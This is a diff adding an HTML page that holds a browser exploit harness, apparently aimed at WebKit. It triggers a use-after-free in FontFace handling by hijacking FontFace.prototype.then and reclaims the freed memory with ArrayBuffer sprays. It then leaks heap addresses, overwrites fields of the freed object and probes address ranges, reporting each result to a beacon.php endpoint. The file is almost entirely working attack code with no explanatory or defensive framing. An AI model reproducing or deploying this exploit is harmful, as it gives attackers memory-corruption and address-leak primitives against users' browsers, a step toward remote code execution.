@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P808</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P808 multi-UAF size discovery</pre>
+<script>
+'use strict';
+var B='';
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET',B+'/beacon.php?tag=P808-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,700))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+function hexQ(bv,off){var lo=bv.getUint32(off,true),hi=bv.getUint32(off+4,true);return'0x'+(hi?(hi.toString(16)+('00000000'+lo.toString(16)).slice(-8)):lo.toString(16));}
+function readU64(bv,off){var lo=bv.getUint32(off,true),hi=bv.getUint32(off+4,true);return{hi:hi,lo:lo};}
+function addrStr(a){return'0x'+a.hi.toString(16)+('00000000'+a.lo.toString(16)).slice(-8);}
+function addrVal(a){return BigInt(a.hi)*BigInt(0x100000000)+BigInt(a.lo>>>0);}
+
+bn('BOOT','v1');
+
+// ============ Reusable UAF function ============
+var uafCount=0;
+function doUAF(name, abSize, cb){
+  uafCount++;
+  var id=uafCount;
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:bb"+id+";src:local(Arial);unicode-range:U+00"+(41+id).toString(16)+";}";
+  document.head.appendChild(st);
+  var face=new FontFace('f'+id,"local('Helvetica')",{unicodeRange:'U+00'+(41+id).toString(16)});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      abs=[];
+      for(var i=0;i<64;i++)abs.push(new ArrayBuffer(abSize));
+      try{document.fonts.check('1em bb'+id);}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f'+id+', bb'+id, String.fromCharCode(0x41+id));
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var bestI=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+      if(nz>bestNz){bestNz=nz;bestI=i;}
+    }
+    if(bestI<0||bestNz<4){
+      cb(null,name+': miss nz='+bestNz);
+      return;
+    }
+    var ab=abs[bestI];
+    var dv=new DataView(ab);
+    var q11=readU64(dv,0x58);
+    if(q11.hi===0){cb(null,name+': q11h=0');return;}
+    var borrow=(q11.lo<0x68)?1:0;
+    var self_addr={hi:q11.hi-borrow,lo:(q11.lo-0x68)>>>0};
+    var q13=readU64(dv,0x68);
+    var q0=readU64(dv,0);
+
+    // Also try to read face.src
+    var srcVal='N/A';
+    try{srcVal=face.src||'empty';}catch(e){srcVal='ERR:'+e.message;}
+
+    cb({ab:ab,dv:dv,self:self_addr,q13:q13,q0:q0,src:srcVal,face:face,nz:bestNz,idx:bestI},null);
+  },400);
+}
+
+// ============ Phase A: 5x sequential UAF at 192B (CSSFontFace size) ============
+function phaseA(cb){
+  bn('A0','5x_uaf_192');
+  log('Phase A: 5x UAF at 192 bytes...');
+  var results=[];
+  var attempt=0,maxAttempts=15; // allow retries
+
+  function next(){
+    if(results.length>=5||attempt>=maxAttempts){
+      // Report all self_addr and q13 values
+      var selfAddrs=[],q13Addrs=[];
+      for(var i=0;i<results.length;i++){
+        selfAddrs.push(addrStr(results[i].self));
+        q13Addrs.push(addrStr(results[i].q13));
+      }
+      bn('A1','hits='+results.length+'|attempts='+attempt);
+      bn('A-SELF',selfAddrs.join('|'));
+      bn('A-Q13',q13Addrs.join('|'));
+
+      // Calculate distances between consecutive q13 values
+      if(results.length>=2){
+        var dists=[];
+        var selfBig=results.map(function(r){return addrVal(r.self);});
+        var q13Big=results.map(function(r){return addrVal(r.q13);});
+        selfBig.sort(function(a,b){return a<b?-1:a>b?1:0;});
+        q13Big.sort(function(a,b){return a<b?-1:a>b?1:0;});
+        for(var i=1;i<selfBig.length;i++){
+          dists.push('sd'+(i-1)+'_'+i+'='+(selfBig[i]-selfBig[i-1]).toString());
+        }
+        for(var i=1;i<q13Big.length;i++){
+          dists.push('qd'+(i-1)+'_'+i+'='+(q13Big[i]-q13Big[i-1]).toString());
+        }
+        bn('A-DIST',dists.join('|'));
+        log('Distances: '+dists.join(' '));
+      }
+
+      // Report .src from first result
+      if(results.length>0){
+        bn('A-SRC','src='+String(results[0].src).slice(0,200));
+      }
+
+      cb(results);
+      return;
+    }
+    attempt++;
+    doUAF('A'+attempt,192,function(r,err){
+      if(r){
+        results.push(r);
+        bn('A-HIT'+results.length,addrStr(r.self)+'|'+addrStr(r.q13)+'|src='+String(r.src).slice(0,100));
+        log('UAF #'+results.length+': self='+addrStr(r.self)+' q13='+addrStr(r.q13));
+      }
+      // Small delay between UAFs
+      setTimeout(next,200);
+    });
+  }
+  next();
+}
+
+// ============ Phase B: Try different AB sizes to reclaim CSSFontFaceSource ============
+function phaseB(cb){
+  bn('B0','size_spray');
+  log('Phase B: size spray for CSSFontFaceSource...');
+  // Try common WebKit object sizes: 64, 96, 128, 160, 224, 256, 320, 384, 448, 512
+  var sizes=[64,96,128,160,224,256,320,384,448,512];
+  var sizeResults=[];
+  var sIdx=0;
+
+  function nextSize(){
+    if(sIdx>=sizes.length){
+      var summary=sizeResults.map(function(r){return r.size+'='+(r.hit?'HIT':'miss');}).join('|');
+      bn('B1',summary);
+      log('Size results: '+summary);
+
+      // Report hits with details
+      for(var i=0;i<sizeResults.length;i++){
+        if(sizeResults[i].hit){
+          var r=sizeResults[i];
+          bn('B-HIT-'+r.size,'self='+addrStr(r.self)+'|q13='+addrStr(r.q13)+'|nz='+r.nz);
+        }
+      }
+      cb(sizeResults);
+      return;
+    }
+    var sz=sizes[sIdx];
+    doUAF('B_'+sz,sz,function(r,err){
+      if(r){
+        sizeResults.push({size:sz,hit:true,self:r.self,q13:r.q13,nz:r.nz,ab:r.ab});
+      } else {
+        sizeResults.push({size:sz,hit:false});
+      }
+      sIdx++;
+      setTimeout(nextSize,200);
+    });
+  }
+  nextSize();
+}
+
+// ============ Phase C: CSS computed style value extraction ============
+function phaseC(firstResults, cb){
+  if(!firstResults||firstResults.length===0){bn('C-SKIP','no_uaf');cb();return;}
+  bn('C0','css_extract');
+  log('Phase C: CSS computed style extraction...');
+  var r=firstResults[0];
+  var dv=r.dv;
+
+  // Try to make the engine interpret AB fields as CSS values
+  // The CSSFontFace has: weight, stretch, style fields that might be read as numbers
+
+  // Read the current computed font properties of an element using our font
+  var testEl=document.createElement('div');
+  testEl.style.fontFamily='f1, serif';
+  testEl.textContent='Test';
+  document.body.appendChild(testEl);
+  document.body.offsetHeight;
+
+  var cs=getComputedStyle(testEl);
+  var props={
+    fontFamily:cs.fontFamily,
+    fontSize:cs.fontSize,
+    fontWeight:cs.fontWeight,
+    fontStyle:cs.fontStyle,
+    fontStretch:cs.fontStretch,
+    lineHeight:cs.lineHeight,
+    fontVariant:cs.fontVariant
+  };
+  var s='';for(var k in props)s+=k+'='+props[k]+'|';
+  bn('C1',s);
+  log('Computed: '+s);
+
+  // C2: Try measureText on canvas
+  var canvas=document.createElement('canvas');
+  canvas.width=200;canvas.height=50;
+  var ctx=canvas.getContext('2d');
+  ctx.font='48px f1, serif';
+  var metrics=ctx.measureText('ABCDEF');
+  var mStr='w='+metrics.width;
+  try{mStr+='|ab='+metrics.actualBoundingBoxAscent;}catch(e){}
+  try{mStr+='|abl='+metrics.actualBoundingBoxLeft;}catch(e){}
+  try{mStr+='|fw='+metrics.fontBoundingBoxAscent;}catch(e){}
+  bn('C2',mStr);
+  log('Metrics: '+mStr);
+
+  // C3: Now modify AB fields and re-measure to see if values change
+  // Save originals
+  var origQ2=dv.getUint32(0x10,true);
+  var origQ3=dv.getUint32(0x18,true);
+  var origQ4=dv.getUint32(0x20,true);
+
+  // Set some fields to distinctive values
+  dv.setUint32(0x10,0x42480000,true); // float 50.0 at q2
+  dv.setUint32(0x18,700,true); // weight=700 at q3 low
+  dv.setUint32(0x20,0x41A00000,true); // float 20.0 at q4
+
+  document.body.offsetHeight;
+  var cs2=getComputedStyle(testEl);
+  var props2={
+    fontFamily:cs2.fontFamily,
+    fontSize:cs2.fontSize,
+    fontWeight:cs2.fontWeight,
+    fontStyle:cs2.fontStyle,
+    lineHeight:cs2.lineHeight
+  };
+  var s2='';for(var k in props2)s2+=k+'='+props2[k]+'|';
+  bn('C3','modified|'+s2);
+
+  ctx.font='48px f1, serif';
+  var m2=ctx.measureText('ABCDEF');
+  bn('C4','post_mod|w='+m2.width);
+
+  // Restore
+  dv.setUint32(0x10,origQ2,true);
+  dv.setUint32(0x18,origQ3,true);
+  dv.setUint32(0x20,origQ4,true);
+
+  // C5: Try face.src getter
+  var srcRes=[];
+  for(var i=0;i<firstResults.length;i++){
+    var f=firstResults[i].face;
+    try{srcRes.push('f'+i+'='+String(f.src).slice(0,100));}catch(e){srcRes.push('f'+i+'=ERR:'+e.message);}
+  }
+  bn('C5',srcRes.join('|'));
+  log('Sources: '+srcRes.join(' '));
+
+  cb();
+}
+
+// ============ Phase D: Full 192B dump with field interpretation ============
+function phaseD(firstResults, cb){
+  if(!firstResults||firstResults.length===0){bn('D-SKIP','no_uaf');cb();return;}
+  bn('D0','full_dump');
+  log('Phase D: full 192B field interpretation...');
+
+  for(var ri=0;ri<Math.min(firstResults.length,3);ri++){
+    var r=firstResults[ri];
+    var view=new BigUint64Array(r.ab);
+    var parts=[];
+    for(var q=0;q<24;q++){
+      if(view[q]!==BigInt(0)){
+        parts.push('q'+q+'=0x'+h16(view[q]));
+      }
+    }
+    bn('D-FULL'+ri,parts.join('|'));
+
+    // Also dump as 32-bit dwords for float interpretation
+    var dv=r.dv;
+    var dwords=[];
+    for(var d=0;d<48;d++){
+      var val=dv.getUint32(d*4,true);
+      if(val!==0){
+        // Check if it looks like a float
+        var fbuf=new ArrayBuffer(4);
+        new Uint32Array(fbuf)[0]=val;
+        var fval=new Float32Array(fbuf)[0];
+        var fstr='';
+        if(isFinite(fval)&&fval!==0&&Math.abs(fval)>0.001&&Math.abs(fval)<1e10){
+          fstr='(f='+fval.toFixed(4)+')';
+        }
+        dwords.push('d'+d+'=0x'+val.toString(16)+fstr);
+      }
+    }
+    // Send in chunks
+    var chunk='';
+    for(var i=0;i<dwords.length;i++){
+      if(chunk.length+dwords[i].length>650){bn('D-DW'+ri,chunk);chunk='';}
+      if(chunk.length>0)chunk+='|';
+      chunk+=dwords[i];
+    }
+    if(chunk)bn('D-DW'+ri,chunk);
+  }
+  cb();
+}
+
+// ============ Phase E: Address range probing beyond heap ============
+function phaseE(firstResults, cb){
+  if(!firstResults||firstResults.length===0){bn('E-SKIP','no_uaf');cb();return;}
+  bn('E0','range_probe');
+  log('Phase E: probing address ranges beyond heap...');
+  var r=firstResults[0];
+  var dv=r.dv;
+  var origQ1hi=dv.getUint32(0x0C,true);
+  var origQ1lo=dv.getUint32(0x08,true);
+
+  // Test specific address ranges: try high nibbles 0x01 through 0x0F, 0x20-0x90
+  // Each at offset 0x00000000
+  var ranges=[];
+  for(var h=1;h<=15;h++)ranges.push({hi:h,lo:0,label:'0x'+h.toString(16)+'_00000000'});
+  for(var h=0x20;h<=0x90;h+=0x10)ranges.push({hi:h,lo:0,label:'0x'+h.toString(16)+'_00000000'});
+  // Also try 0x200-0x900 (WebKit code region candidates)
+  for(var h=0x200;h<=0x900;h+=0x100)ranges.push({hi:h,lo:0,label:'0x'+h.toString(16)+'_00000000'});
+
+  var alive=[],idx=0;
+
+  function nextRange(){
+    if(idx>=ranges.length){
+      bn('E1','alive='+alive.join(','));
+      log('Alive ranges: '+alive.join(', '));
+
+      // Restore q1
+      dv.setUint32(0x08,origQ1lo,true);
+      dv.setUint32(0x0C,origQ1hi,true);
+      cb();
+      return;
+    }
+    var t=ranges[idx];
+    dv.setUint32(0x08,t.lo,true);
+    dv.setUint32(0x0C,t.hi,true);
+
+    var sp=document.createElement('span');
+    sp.style.fontFamily='f1, serif';
+    sp.textContent='.';
+    document.body.appendChild(sp);
+    document.body.offsetHeight;
+
+    setTimeout(function(){
+      alive.push(t.label);
+      idx++;
+      nextRange();
+    },80);
+  }
+  nextRange();
+}
+
+// ============ Phase F: Fine scan of discovered alive ranges ============
+function phaseF(firstResults, cb){
+  if(!firstResults||firstResults.length===0){bn('F-SKIP','no_uaf');cb();return;}
+  bn('F0','fine_scan');
+  log('Phase F: fine scan of key ranges...');
+  var r=firstResults[0];
+  var dv=r.dv;
+  var origQ1hi=dv.getUint32(0x0C,true);
+  var origQ1lo=dv.getUint32(0x08,true);
+
+  // Scan the 0x10 range more finely to find heap boundaries
+  // We know 0x10_00000000 to 0x10_0FF00000 is alive
+  // Test 0x10_10000000 upward to find the heap end
+  var tests=[];
+  for(var mb=0x10;mb<=0xFF;mb+=0x01){
+    tests.push({hi:0x10,lo:mb*0x1000000,label:'0x10_'+('00000000'+(mb*0x1000000).toString(16)).slice(-8)});
+  }
+
+  var alive=[],dead=[],idx=0;
+
+  function nextTest(){
+    if(idx>=tests.length){
+      bn('F1','alive='+alive.length+'|dead_start='+(dead.length>0?dead[0]:'none'));
+      log('Fine scan: '+alive.length+' alive, first dead: '+(dead.length>0?dead[0]:'none'));
+
+      // Restore
+      dv.setUint32(0x08,origQ1lo,true);
+      dv.setUint32(0x0C,origQ1hi,true);
+      cb();
+      return;
+    }
+    var t=tests[idx];
+    dv.setUint32(0x08,t.lo,true);
+    dv.setUint32(0x0C,t.hi,true);
+
+    var sp=document.createElement('span');
+    sp.style.fontFamily='f1, serif';
+    sp.textContent='.';
+    document.body.appendChild(sp);
+    document.body.offsetHeight;
+
+    setTimeout(function(){
+      alive.push(t.label);
+      idx++;
+      nextTest();
+    },50);
+  }
+  nextTest();
+}
+
+// ============ MAIN ============
+phaseA(function(aResults){
+  setTimeout(function(){
+    phaseB(function(bResults){
+      setTimeout(function(){
+        phaseC(aResults, function(){
+          setTimeout(function(){
+            phaseD(aResults, function(){
+              setTimeout(function(){
+                phaseE(aResults, function(){
+                  setTimeout(function(){
+                    phaseF(aResults, function(){
+                      bn('DONE','all_complete');
+                      log('\nDONE');
+                    });
+                  },100);
+                });
+              },100);
+            });
+          },100);
+        });
+      },100);
+    });
+  },100);
+});
+</script></body></html>
